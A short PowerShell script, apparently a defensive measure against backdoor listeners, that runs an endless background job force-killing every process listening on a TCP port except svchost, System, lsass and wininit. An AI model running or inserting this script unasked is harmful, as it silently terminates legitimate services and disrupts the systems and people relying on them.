Start-Job -Name "KillListeners" -ScriptBlock {
    function Kill-Listeners {
        $knownServices = @("svchost", "System", "lsass", "wininit")
        $connections = Get-NetTCPConnection -State Listen -ErrorAction SilentlyContinue
        foreach ($conn in $connections) {
            if ($knownServices -notcontains (Get-Process -Id $conn.OwningProcess -ErrorAction SilentlyContinue).ProcessName) {
                Stop-Process -Id $conn.OwningProcess -Force -ErrorAction SilentlyContinue
            }
        }
    }

    while ($true) {
        Kill-Listeners
        Start-Sleep -Seconds 10
    }
}
